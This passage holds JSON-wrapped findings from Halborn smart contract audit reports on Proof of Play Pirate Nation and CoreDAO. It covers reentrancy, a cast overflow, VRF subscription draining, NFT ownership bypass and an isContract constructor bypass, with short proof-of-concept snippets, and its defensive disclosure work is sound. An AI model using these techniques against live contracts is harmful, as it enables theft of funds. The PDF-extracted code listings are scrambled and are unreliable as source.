, stake . tokenId , stake . reservationId ); // Emit event emit GameItemUnstaked ( account , stake . tokenId , stake .  balance ); 791 792 793 794 795 796 797 } } else { // Reset collection timer stake . value = uint80 ( pirateShip ? block . timestamp : totalTaxInGoldPerRank ); } Solidity 0.8 is introducing type checking for arithmetic operations, but not for type casting. Because of this, an overflow may occur in the Line 794 if totalTaxInGoldPerRank is higher than 2**80-1 = 1208925819614629174706175. If that overflow occurs any user with a Navy staked would be able to call claimNavyStakeRewards() as many times as he wanted with no time restriction minting with every call the same amount of Gold Tokens. Proof of Concept: In the image below, we can see how the user2 keeps increasing his GoldToken balance after every claimNavyStakeRewards(): 41 Risk Level: Likelihood - 4 Impact - 5 Recommendation: It is recommended to: 1. Update GameItemStake.value uint80 to at least an uint128. 2. Use OpenZeppelins SafeCast library. 42 Remediation Plan: The SOLVED: Proof of Play team GameItemStake.value to uint128. SafeCast library is now used for all the castings. fixed the On the other hand, OpenZeppelins updating issue the by 43 ", "labels": ["Halborn", "ProofOfPlay_Pirate_Nation", "Severity: High"]}, {"title": "REENTRANCY IN RAFFLEMINTV1.WITHDRAWNONRAFFLEPROCEEDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract RaffleMintV1, the function withdrawNonRaffleProceeds() is vulnerable to reentrancy as it updates the nonRaffleWithdrawableProceeds after the payable(_msgSender()).call{value: proceeds}(\"\");: Listing 8: RaffleMintV1.sol (Lines 522,526) 511 /* @notice Allows contract owner to withdraw proceeds of mints  initiated after raffle */ nonRaffleWithdrawableProceeds > 0, \" NONRAFFLE_PAYOUT_EMPTY : No proceeds available to claim \" // Ensure there are proceeds to claim require ( 512 function withdrawNonRaffleProceeds () external onlyOwner { 513 514 515 516 517 518 519 520 521 522 uint256 proceeds = nonRaffleWithdrawableProceeds ; // Pay owner proceeds ( bool sent , ) = payable ( _msgSender () ). call { value : proceeds }( \" \" );  ); 523 524 525 526 527 528 529 530 } require ( sent == true , \" NONRAFFLE_PAYOUT_UNSUCCESFUL \" ); // Proceeds are now claimed so clear amount nonRaffleWithdrawableProceeds = 0; // Emit successful proceeds claim emit NonRaffleProceedsClaimed ( _msgSender () , proceeds ); By exploiting this reentrancy, the contract owner could drain all the Ether of the smart contract and users would not be able to get a refund 44 of their losing raffle tickets. Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to set nonRaffleWithdrawableProceeds to 0 before the Ether transfer. For example: Listing 9: RaffleMintV1.sol (Lines 521,524) 511 /* @notice Allows contract owner to withdraw proceeds of mints  initiated after raffle */ ); nonRaffleWithdrawableProceeds > 0, \" NONRAFFLE_PAYOUT_EMPTY : No proceeds available to claim \" // Ensure there are proceeds to claim require ( 512 function withdrawNonRaffleProceeds () external onlyOwner { 513 514 515 516 517 518 519 520 521 522 523 524 uint256 proceeds = nonRaffleWithdrawableProceeds ; nonRaffleWithdrawableProceeds = 0; // Pay owner proceeds ( bool sent , ) = payable ( _msgSender () ). call { value : proceeds }( \" \"  ); 525 526 527 528 529 } require ( sent == true , \" NONRAFFLE_PAYOUT_UNSUCCESFUL \" ); // Emit successful proceeds claim emit NonRaffleProceedsClaimed ( _msgSender () , proceeds ); Remediation Plan: SOLVED: The Proof of Play team fixed the issue by adding the nonReentrant modifier to the withdrawNonRaffleProceeds() function. 45 ", "labels": ["Halborn", "ProofOfPlay_Pirate_Nation", "Severity: High"]}, {"title": "USERS CAN START THE SAME QUEST MULTIPLE TIMES DRAINING THE CHAINLINK VRF SUBSCRIPTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the QuestSystem contract every time a quest is completed Chainlink VRF is used: Listing 10: QuestSystem.sol (Lines 477,482) external nonReentrant whenNotPaused 436 function completeQuest ( uint64 activeQuestId ) 437 438 439 440 { 441 442 address account = _msgSender () ; ActiveQuest storage activeQuest = _activeQuests [ activeQuestId  ]; 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 // Make sure active quest exists require ( activeQuest . status == ActiveQuestStatus . IN_PROGRESS , \" INVALID_ACTIVE_QUEST_ID : ActiveQuest is not IN_PROGRESS \" ); // Check to make sure sender is the quest owner require ( activeQuest . account == account , \" INVALID_ACCOUNT : Sender did not undertake this quest \" ); // Make sure quest is still active QuestDefinition storage questDef = _questDefinitions [ activeQuest . questId ]; 46 460 461 462 463 464 465 require ( questDef . active == true , \" QUEST_NOT_ACTIVE : Cannot complete inactive quest \" ); uint256 endTime = activeQuest . startTime + questDef .  completionSeconds ; require ( endTime <= block . timestamp , \" NOT_READY_TO_COMPLETE : Quest is not ready to be completed  \" 469 470 471 ); // TODO : Maybe we fail here automatically if expire time has  passed instead of error ? 472 473 474 475 require ( questDef . expireSeconds == 0 || ( endTime + questDef . expireSeconds > block . timestamp ) , \" QUEST_HAS_EXPIRED : Quest has expired and is no longer  completeable \" ); 466 467 468 476 477 478 // Figure out final amount of gold the player earns with some  randomness 479 480 481 482 483 484 485 486 487 } uint256 requestId = _requestRandomWords (1) ; _vrfRequests [ requestId ] = VRFRequest ({ account : account , activeQuestId : activeQuestId }) ; // Change status activeQuest . status = ActiveQuestStatus . GENERATING_RESULTS ; Considering that the accountData.completions[questId] mapping is only updated after a quest is completed successfully, the QuestDefinition. MaxCompletions value can be easily bypassed. As explained in the QUESTDEFINITION.MAXCOMPLETIONS CAN BE BYPASSED BY STARTING THE SAME QUEST MULTIPLE TIMES BEFORE COMPLETING THEM issue, a user can start a quest as many times as he wants as long as he has enough inputs. 47 For ERC721 and ERC1155 inputs, as these assets are locked once a quest is started, it is not possible to perform the same quest twice. But for ERC20 inputs as there is an open TODO and this is not implemented yet, the ERC20 tokens are not locked when the quest is started, any user can start the same quest as many times as he wants. Then, after waiting a certain period of time, the same user could complete all the quests that he started. Each completion would make use of Chainlink VRF subscription. It would be possible to totally drain all the LINK balance of the subscription, as there is no limit on how many times the user could start the same quest. Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to not allow a user to start the same questId until the same questId has been completed. Remediation Plan: RISK ACCEPTED: No mitigation was added to prevent this issue. 48 ", "labels": ["Halborn", "ProofOfPlay_Pirate_Nation", "Severity: High"]}, {"title": "USERS CAN CRAFT USING AS INPUT AN NFT THEY DO NOT OWN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the CraftingSystem contract, the craft() function is called every time a new craft is started: Listing 11: CraftingSystem.sol (Lines 425-435) // Auto - Lock NFT if necessary ILockingSystem lockingSystem = _lockingSystem () ; if ( 425 } else if ( tokenType == GameRegistryLibrary . TokenType . ERC721 ) { 426 427 428 429 430 431 432 433 434 input . tokenContract , input . tokenId lockingSystem . isNFTLocked ( lockingSystem . lockNFT ( input . tokenContract , input . ) == false ) {  tokenId ); 435 } As we can see, when ERC721 tokens are used as inputs, the function does not check that the token is owned by the caller. Moreover, when an NFT is used as an input for a craft, they are locked and an exclusive reservation is created. Once the craft is completed, the exclusive reservation is removed, but not the lock. Similar to what was described in HAL-01 issue, initially a user would not be able to use the NFT of another user as input as during the lockNFT() call the transaction would revert with the ORIGIN_NOT_NFT_OWNER error. Although, once the original owner has started and completed that craft 49 with that NFT as input, the NFT would remain locked and as this NFT is already locked any user would be able now to start a craft using that NFT as the NFT ownership is not checked to create a reservation. Proof of Concept: Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to: 1. Add a require statement that checks that the caller owns the NFT in the TokenType.ERC721 if code block, in the craft() function. 50 2. Also, unlocking the NFT before removing the NFT reservation in the _unlockRecipeInput() function. Remediation Plan: The Proof of Play team SOLVED: GameHelperLibrary. _verifyInputOwnership(input, account); call in the craft() function that validates that the inputs are owned by the caller. added the 51 ", "labels": ["Halborn", "ProofOfPlay_Pirate_Nation", "Severity: High"]}, {"title": "CRAFTAMOUNT CAN BE SET TO ZERO DRAINING THE CHAINLINK VRF SUBSCRIPTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the CraftingSystem contract, the craft() function can be called It is not possible to exploit passing a 0 value as a craftAmount. this in any way when ERC1155 tokens are used as inputs, as these errors RESERVE_AMOUNT_MUST_BE_NON_ZERO, UNLOCK_AMOUNT_MUST_BE_NON_ZERO. exploit: would stop the When using ERC721 tokens as inputs, as they get an exclusive reservation, this value is not even used, and it is not possible to abuse this. But when using ERC20 tokens as inputs, it is possible to call this craft() function infinite times with no cost as no ERC20 tokens would be burnt because inputDef.tokenPointer.amount * params.craftAmount would always be zero. The attacker will never receive any reward as _completeRecipe will always be called with params.craftAmount = 0 but with every craft() call, if the RecipeDefinition.needsVRF == True, a Chainlink VRF request will be done. This means that any malicious user could abuse this in order to drain the Chainlink VRF subscription. 52 Proof of Concept: Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to add a require statement in the craft() function that checks that the craftAmount is higher than zero. 53 Remediation Plan: SOLVED: The Proof of Play team added a require statement in the craft() function that enforces that craftAmount is higher than zero. 54 ", "labels": ["Halborn", "ProofOfPlay_Pirate_Nation", "Severity: High"]}, {"title": "CRAFTS COOLDOWN TIME ARE ALWAYS ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "the In the CraftingSystem contract, lastCompletionTime in the _accountData mapping is not updated. This means that the cooldown value is never considered, so all crafts have no cooldown. when a craft is completed, Risk Level: Likelihood - 5 Impact - 2 Recommendation: It is recommended to update the lastCompletionTime value every time a craft is successfully completed. Remediation Plan: SOLVED: The value Proof of Play team the PARTIALLY lastCompletionTime called. Although, this value will be updated even if no crafts are completed successfully. This value should only be updated if at least one craft was completed successfully. updates is _completeRecipe() every time now 55 ", "labels": ["Halborn", "ProofOfPlay_Pirate_Nation", "Severity: Medium"]}, {"title": "QUESTDEFINITION.MAXCOMPLETIONS CAN BE BYPASSED BY STARTING THE SAME QUEST MULTIPLE TIMES BEFORE COMPLETING THEM", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the QuestSystem contract, the _isQuestAvailable() function is called every time a new quest is started: Listing 12: QuestSystem.sol (Lines 597-602) } return false ; if (! questDef . active ) { 573 function _isQuestAvailable ( address account , 574 uint32 questId , 575 QuestDefinition memory questDef 576 577 ) internal view returns ( bool ) { 578 579 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 account , questDef . requirements return false ; ) == false ); if ( ) { } // Make sure user hasn 't completed already // Perform all requirement checks IRequirementSystem requirementSystem = IRequirementSystem ( _getSystem ( GameRegistryLibrary . REQUIREMENT_SYSTEM ) requirementSystem . performAccountCheckBatch ( 56 596 597 598 599 AccountData storage accountData = _accountData [ account ]; if ( questDef . maxCompletions > 0 && accountData . completions [ questId ] >= questDef .  maxCompletions ) { return false ; } // Make sure enough time has passed before completions if ( questDef . cooldownSeconds > 0) { if ( ) { } accountData . lastCompletionTime [ questId ] + questDef . cooldownSeconds > block . timestamp return false ; } return true ; 600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 615 616 } As we can see, one of the requirements checked is that the quest has not already been completed more than the QuestDefinition.MaxCompletions set. Although, the accountData.completions[questId] is only updated when a quest is completed successfully. a who user that means This this has QuestDefinition.MaxCompletions limit and complete the quests as many times as the inputs he owns allows him. All he has to do, is starting the same questId consecutively, as many times as his inputs allows him, before completing them. inputs bypass enough can Risk Level: Likelihood - 5 Impact - 2 57 Recommendation: It is recommended to not allow a user to start the same questId until the same questId has been completed. Basically, a user should not be doing the same quest twice at the same time. Remediation Plan: RISK ACCEPTED: The Proof of Play team accepted the risk of this finding. 58 3.10 (HAL-10) LACK OF PAUSABLE FUNCTIONALITY IN THE LOOTSYSTEM CONTRACT - MEDIUM  Found in Commit ID: f5c3190140139941351a68da617a91315487e917 ", "labels": ["Halborn", "ProofOfPlay_Pirate_Nation", "Severity: Informational"]}, {"title": "UNDELEGATED COINS ARE NOT CONSIDERED ON THE REWARD DISTRIBUTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The distributePowerReward function is used to distribute delegated hash power rewards to the candidate validator. The method is designed to be called at the beginning of the turn round workflow. One potential issue with the contract is that undelegated coin rewards are not considered. This can lead to inaccurate or incomplete calculations and potentially cause issues with rewards distribution. In order to address this issue, the contract should be updated to consider undelegated coin rewards and incorporate them into the calculations for reward distribution. This will help ensure the accuracy and reliability of the reward distribution pro- cess and can help prevent potential issues or errors. With the workflow, remaining rewards directly compared to the miners total rewards. Code Location: /contracts/PledgeAgent.sol#L204 Listing 1: PledgeAgent.sol return ; function distributePowerReward ( address candidate , address [] // if no hash power is delegated in the round , return RoundState storage rs = stateMap [ roundTag ]; if ( rs . power == 1) { 1  calldata miners ) external override onlyCandidate { 2 3 4 5 6 7 8  addresses 9  delegates a BTC block 10  BTCLightClient } // distribute rewards to every miner // note that the miners are represented in the form of reward // and they can be duplicated because everytime a miner // to a validator on Core blockchain , a new record is added in 26 } Reward storage r = a. rewardSet [l -1]; if ( r . totalReward == 0 || r . round != roundTag ) { } uint256 reward = rs . coin * POWER_BLOCK_FACTOR * rs . powerFactor uint256 totalReward = reward * minerSize ; uint256 remainReward = r . remainReward ; require ( remainReward >= totalReward , \" there is not enough Agent storage a = agentsMap [ candidate ]; uint256 l = a . rewardSet . length ; if ( l == 0) { uint256 minerSize = miners . length ; return ; return ; 11 12 13 14 15 16 17 18 19 20  / 10000 * r . totalReward / r . score ; 21 22 23 24 25  reward \"); 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 delete a . rewardSet [l -1]; if ( minerSize == 0) { } else if ( totalReward != 0) { if ( r . coin == 0) { } else { } } } } } r. remainReward -= totalReward ; rewardMap [ miners [ i ]] += reward ; rewardMap [ miners [0]] += dust ; for ( uint256 i = 0; i < minerSize ; i ++) { payable ( FOUNDATION_ADDR ). transfer ( remainReward ); uint256 dust = remainReward - totalReward ; if ( dust != 0) { Risk Level: Likelihood - 1 Impact - 5 27 Proof of Concept: Listing 2 1  validator_set ): 2 3 4 5 6  MIN_INIT_DELEGATE_VALUE }) 7 8 9 10 11 12 }) def test_delegate2validator ( self , pledge_agent , candidate_hub , operator = accounts [1] consensus_address = register_candidate ( operator = operator ) candidate_hub . turnRound () assert validator_set . isValidator ( consensus_address ) tx = pledge_agent . delegateCoin ( operator , { \" value \" : expect_event (tx , \" delegatedCoin \" , { \" agent \": operator , \" delegator \" : accounts [0] , \" amount \" : MIN_INIT_DELEGATE_VALUE , \" totalAmount \" : MIN_INIT_DELEGATE_VALUE Recommendation: Ensure that undelegated coin rewards are handled by the system. Remediation Plan: SOLVED: The CoreDAO team solved the issue in this commit d2dfe11 by changing the flow in the distributePowerReward function. 28 ", "labels": ["Halborn", "CoreDAO_Genesis", "Severity: Medium"]}, {"title": "PROPOSAL CAN BE DEFEATED IF THERE IS NO MEMBER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "GovHub is the governance contract for CoreDAO, a contract that allows any member to submit proposals with the initiator address stored in the proposer field. On the GovHub contract, the proposal is marked as DEFEATED If forVotes is smaller than totalVotes/2. However, if all the members are deleted during the genesis with governance, all proposals can be defeated in the system. The system should be ensured that members length have a minimum threshold. Code Location: /contracts/GovHub.sol#L139 Listing 3: GovHub.sol (Line 248) 238 function removeMember ( address member ) external onlyInit onlyGov  { 239 240 241 242 243 244 245 246 247 248 249 } uint256 index = members [ member ]; require ( index > 0, \" member does not exist \" ); if ( index != memberSet . length ) { address addr = memberSet [ memberSet . length - 1]; memberSet [ index - 1] = addr ; members [ addr ] = index ; } memberSet . pop () ; delete members [ member ]; emit MemberDeleted ( member ); 29 Risk Level: Likelihood - 3 Impact - 3 Proof of Concept: Listing 4 function testMinimumThresholdOnTheRemoveMember () public { address public user1 = 0 address public user2 = 0 1  x9fB29AAc15b9A4B7F17c3385939b007540f4d791 ; 2  x96C42C56fdb78294F96B0cFa33c92bed7D75F96a ; 3 4 5 6 7 8 9 10 vm . startPrank ( govHubAddress ); gov_hub . removeMember ( user1 ); gov_hub . removeMember ( user2 ); gov_hub . members ; vm . stopPrank () ; } Recommendation: Consider defining a minimum threshold on the member size. 30 Remediation Plan: SOLVED: The CoreDAO team solved the issue in commit f7a91316 by adding the minimum requirement. 31 ", "labels": ["Halborn", "CoreDAO_Genesis", "Severity: Medium"]}, {"title": "ISCONTRACT MODIFIER CAN BE BYPASSED THROUGH CONSTRUCTOR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Validator can register as a Core validator candidate by calling However, feeAddress and consensus register in CandidateHub contract. address are checked with isContract modifier. the isContract function that uses EXTCODESIZE was discovered to be bypassable. The function will return false if it is invoked from a contracts constructor. Because the contract has not been deployed yet. Code Location: /contracts/CandidateHub.sol#L221 Listing 5: CandidateHub.sol (Lines 221,222) 213 function register ( address consensusAddr , address payable feeAddr  , uint32 commissionThousandths ) external payable onlyInit require ( operateMap [ msg . sender ] == 0, \" candidate already exists 214 215 216 217 {  \" ); 218 require ( int256 ( msg . value ) >= requiredMargin , \" deposit is not  enough \"); 219 require ( commissionThousandths > 0 && commissionThousandths <  1000 , \" commissionThousandths should in range (0 , 1000) \"); 220 require ( consensusMap [ consensusAddr ] == 0, \" consensus already  exists \"); 221 require (! isContract ( consensusAddr ) , \" contract is not allowed  to be consensus address \"); 222 require (! isContract ( feeAddr ) , \" contract is not allowed to be  fee address \" ); 223 224 225 // check jail status require ( jailMap [ msg . sender ] < roundTag , \" it is in jail \" ); 32 226 227 uint status = SET_CANDIDATE ; candidateSet . push ( Candidate ( msg . sender , consensusAddr , feeAddr  , commissionThousandths , int256 ( msg . value ) , status , roundTag ,  commissionThousandths )) ; 228 229 230 231 232 uint256 index = candidateSet . length ; operateMap [ msg . sender ] = index ; consensusMap [ consensusAddr ] = index ; emit registered ( msg . sender , consensusAddr , feeAddr ,  commissionThousandths , int256 ( msg . value )) ; 233 } Risk Level: Likelihood - 2 Impact - 4 Proof of Concept: Listing 6 bool public isContract ; address public addr ; 1 contract Hack { 2 3 4 5  0. 6 7 8 9 10 11 12 13 } } // When contract is being created , code size ( extcodesize ) is // This will bypass the isContract () check constructor ( address _target ) { isContract = Target ( _target ). isContract ( address ( this )) ; addr = address ( this ); // This will work Target ( _target ). protected () ; 33 Recommendation: If you want to make sure that an external owned account is calling your However, contract, a simple way is require(msg.sender == tx.origin). preventing a contract is an antipattern with security and interoperability considerations.  Reference : Solidity Issues Remediation Plan: SOLVED: The CoreDAO team solved the issue in this commit b51c87f8 by deleting the isContract check. 34 ", "labels": ["Halborn", "CoreDAO_Genesis", "Severity: Medium"]}, {"title": "BURN ADDRESS SHOULD BE DEFINED AS DIFFERENT THAN SYSTEM CONTRACTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The CoreDAO chain implements a number of dedicated built-in system con- tracts. Unlike smart contracts deployed by blockchain users, built-in system contracts were deployed at genesis time. The system contracts are increasing one by one. Instead of using the burn address as an address, the address can be defined different from the system contract addresses. Code Location: contracts/System.sol#L20 Listing 7: System.sol address public constant VALIDATOR_CONTRACT_ADDR = 0 address public constant SLASH_CONTRACT_ADDR = 0 address public constant SYSTEM_REWARD_ADDR = 0 address public constant LIGHT_CLIENT_ADDR = 0 address public constant RELAYER_HUB_ADDR = 0 1  x0000000000000000000000000000000000001000 ; 2  x0000000000000000000000000000000000001001 ; 3  x0000000000000000000000000000000000001002 ; 4  x0000000000000000000000000000000000001003 ; 5  x0000000000000000000000000000000000001004 ; 6  x0000000000000000000000000000000000001005 ; address public constant GOV_HUB_ADDR = 0 7  x0000000000000000000000000000000000001006 ; 8  x0000000000000000000000000000000000001007 ; 9 address public constant BURN_ADDR = 0  x0000000000000000000000000000000000001008 ; 10  x0000000000000000000000000000000000001009 ; address public constant FOUNDATION_ADDR = 0 address public constant PLEDGE_AGENT_ADDR = 0 address public constant CANDIDATE_HUB_ADDR = 0 35 Risk Level: Likelihood - 1 Impact - 5 Scenario:  System Burn contract should not be updated during the upgrades.  All burned funds will be located on the Burn address.  In the BSC, BurnContract address is deleted from the constant con- tract addresses. Recommendation: Ensure that BURN address is different from system contract addresses. Remediation Plan: RISK ACCEPTED: After some internal discussion, the CoreDAO team has de- cided to maintain the current implementation. Both the BSC implementation and the Core implementation require software updates to change the way in which the burn address works. 36 ", "labels": ["Halborn", "CoreDAO_Genesis", "Severity: Medium"]}, {"title": "MISSING CHECK TO IF THE AGENT IS MSG.SENDER WHEN TRANSFERRING POWER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Delegators can call transferPower in PledgeAgent to transfer BTC hash The transferPower method is power delegate to a different validator. a simpler version of delegateHashPower since the delegator has already proved to be a valid BTC miner when calling delegateHashPower previously. During the code review, It has been noticed that when power is transferred, agent is set to target. However, the function can be called by multiple time because of there is no check If the m.agent is msg.sender. Code Location: /contracts/PledgeAgent.sol#L296 Listing 8 function transferPower ( address targetAgent ) external { require ( ICandidateHub ( CANDIDATE_HUB_ADDR ). canDelegate ( 1 2  targetAgent ) , \" agent is inactivated \"); 3 4 5 6  agent are the same one \" ); 7 8 9 10 11 } BtcDelegator storage m = btcDelegatorsMap [ msg . sender ]; require ( m. agent != address (0 x00 ) , \" delegator does not exist \"); address sourceAgent = m. agent ; require ( sourceAgent != targetAgent , \" source agent and target m. agent = targetAgent ; m. power = 0; emit transferredPower ( sourceAgent , targetAgent , msg . sender ); 37 Risk Level: Likelihood - 3 Impact - 3 Proof of Concept: 1. transferPower differs from transferCoin which clearly combines un- delegate and delegate steps. A BTC miner can only delegate hash power to one validator, and the rewards in each round are automat- ically distributed to them when the system executes a turn round. As a result, transferPower is actually similar to delegateHashPower instead of transferCoin. 2. However, when the power is transferred to targetAgent, there is no check If source agent power is zero. 3. Even if power is zero, the delegator can call a function multiple times. Recommendation: Consider adding a logic to verify source agent when the delegation power is transferred. Remediation Plan: SOLVED: According to the Satoshi Plus consensus algorithm, BTC hash power is measured using blocks produced on the BTC network. In the new design, mining pools no longer need to use their private keys to sign transactions on the Core blockchain. Instead, they can include delegate information directly in the blocks they generate on the BTC network. Calculations for distributing rewards to hash delegators are now performed in a dedicated function, which is called directly by the CandidateHub.turnRound method. Additionally, rewards are no longer automatically sent to hash delegators, but must be claimed in the new workflow. For that reason, the CoreDAO team has solved the issue thanks to the new improved design. As a result, the function was deleted due to the new design. 38 ", "labels": ["Halborn", "CoreDAO_Genesis", "Severity: Medium"]}, {"title": "CANDIDATES ARE NOT LIMITED ON THE REGISTRATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "One can register as a Core validator candidate by calling register in CandidateHub contract. The calling address will be used as the operator address, which represents the validator identity. However, there is no max number of candidates is defined by the system. In the CandidateHub. turnRound function calls distributeReward in ValidatorSet to distribute rewards to all roles, expect BTC hash delegators. If the candidateSet is large enough, turnRound for loops in this contract runs over an array, which can be artificially inflated If there are many registrations. An attacker can create many candidates, making the candidate Set array large. In principle, this can be done such that the gas required to execute the for loop exceeds the block gas limit, essentially making the turnRound() function inoperable. Code Location: contracts/CandidateHub.sol#L213 Listing 9 require ( operateMap [ msg . sender ] == 0, \" candidate already exists function register ( address consensusAddr , address payable feeAddr { external payable onlyInit 1  , uint32 commissionThousandths ) 2 3 4 5  \" ); 6  enough \"); 7  1000 , \" commissionThousandths should in range (0 , 1000) \"); 8  exists \"); require ( consensusMap [ consensusAddr ] == 0, \" consensus already require ( int256 ( msg . value ) >= requiredMargin , \" deposit is not require ( commissionThousandths > 0 && commissionThousandths < 39 require (! isContract ( consensusAddr ) , \" contract is not allowed require (! isContract ( feeAddr ) , \" contract is not allowed to be uint status = SET_CANDIDATE ; candidateSet . push ( Candidate ( msg . sender , consensusAddr , feeAddr // check jail status require ( jailMap [ msg . sender ] < roundTag , \" it is in jail \" ); 9  to be consensus address \"); 10  fee address \" ); 11 12 13 14 15  , commissionThousandths , int256 ( msg . value ) , status , roundTag ,  commissionThousandths )) ; 16 17 18 19 20  commissionThousandths , int256 ( msg . value )) ; 21 uint256 index = candidateSet . length ; operateMap [ msg . sender ] = index ; consensusMap [ consensusAddr ] = index ; emit registered ( msg . sender , consensusAddr , feeAddr , } Risk Level: Likelihood - 2 Impact - 4 Proof of Concept: Listing 10 function testRegister () public { for ( uint i =0; i < addrSet . length ; i ++) { address newCandidate = addrSet [ i ]; vm . startPrank ( newCandidate , newCandidate ); candidateHub . register { value : 10000 ether }( newCandidate , 1 2 3 4 5  payable ( newCandidate ) , 10) ; 6 7 8 vm . stopPrank () ; } } 40 Recommendation: Consider define governance parameter like a newMaxNumOfCandidates. Remediation Plan: SOLVED: The CoreDAO team solved the issue in commit 6d456cf2 by adding CANDIDATE_COUNT_LIMIT. 41 ", "labels": ["Halborn", "CoreDAO_Genesis", "Severity: Medium"]}, {"title": "MISSING ONLY INIT MODIFIER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The onlyInit modifier throws an error If the source contract is not initialized. In the SystemReward contract, receiveRewards function is missing onlyInit modifier. If the function is called without initializa- tion, all address balance will be burned in the contract. Code Location: /contracts/SystemReward.sol#L40 Listing 11 function receiveRewards () external payable override { if ( msg . value > 0) { 1 2 3 4  incentiveBalanceCap }() ; 5 6 7 8 } } if ( address ( this ). balance > incentiveBalanceCap ) { IBurn ( BURN_ADDR ). burn { value : address ( this ). balance - } emit receiveDeposit ( msg . sender , msg . value ); /contracts/BtcLightClient.sol#L200 Listing 12 function claimRelayerReward ( address relayerAddr ) external { uint256 reward = relayerRewardVault [ relayerAddr ]; require ( reward != 0 , \" no relayer reward \" ); relayerRewardVault [ relayerAddr ] = 0; address payable recipient = payable ( relayerAddr ); ISystemReward ( SYSTEM_REWARD_ADDR ). claimRewards ( recipient , 1 2 3 4 5 6  reward ); } 7 42 Risk Level: Likelihood - 2 Impact - 4 Proof of Concept: Listing 13 1 2 3 4 5 6 7 8 function testReceiveRewardsMissingModifier () public { for ( uint i =0; i < addrSet . length ; i ++) { address newCandidate = addrSet [ i ]; vm . startPrank ( newCandidate , newCandidate ); systemReward . receiveRewards { value : 10000 ether }() ; vm . stopPrank () ; } } Recommendation: It is recommended to implement onlyInit modifier. Remediation Plan: SOLVED: The CoreDAO team solved the issue in the following commits b283001 and 9e290d8 by adding the onlyInit modifier. 43 ", "labels": ["Halborn", "CoreDAO_Genesis", "Severity: Medium"]}, {"title": "DUST IS ADDED INTO THE FIRST MINER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "distributePowerReward function is used to distribute rewards for delegated hash power on the candidate validator. The method is designed to be called at the beginning of the turn round workflow. However, the remaining dust is always added to the first miner of the system. Code Location: /contracts/PledgeAgent.sol#L240 Listing 14 function distributePowerReward ( address candidate , address [] } // distribute rewards to every miner // note that the miners are represented in the form of reward // and they can be duplicated because everytime a miner return ; // if no hash power is delegated in the round , return RoundState storage rs = stateMap [ roundTag ]; if ( rs . power == 1) { 1  calldata miners ) external override onlyCandidate { 2 3 4 5 6 7 8  addresses 9  delegates a BTC block 10  BTCLightClient 11 12 13 14 15 16 17 18 19 Agent storage a = agentsMap [ candidate ]; uint256 l = a . rewardSet . length ; if ( l == 0) { } Reward storage r = a. rewardSet [l -1]; if ( r . totalReward == 0 || r . round != roundTag ) { return ; return ; } // to a validator on Core blockchain , a new record is added in 44 uint256 reward = rs . coin * POWER_BLOCK_FACTOR * rs . powerFactor uint256 totalReward = reward * minerSize ; uint256 remainReward = r . remainReward ; require ( remainReward >= totalReward , \" there is not enough for ( uint256 i = 0; i < minerSize ; i ++) { uint256 minerSize = miners . length ; rewardMap [ miners [ i ]] += reward ; } 20  / 10000 * r . totalReward / r . score ; 21 22 23 24 25  reward \"); 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 delete a . rewardSet [l -1]; if ( minerSize == 0) { } else if ( totalReward != 0) { if ( r . coin == 0) { } else { } } } } r. remainReward -= totalReward ; rewardMap [ miners [0]] += dust ; payable ( FOUNDATION_ADDR ). transfer ( remainReward ); uint256 dust = remainReward - totalReward ; if ( dust != 0) { Proof of Concept: Listing 15 def test_undelegate_with_reward ( self , pledge_agent ): operator = accounts [1] consensus = register_candidate ( operator = operator ) pledge_agent . delegateCoin ( operator , 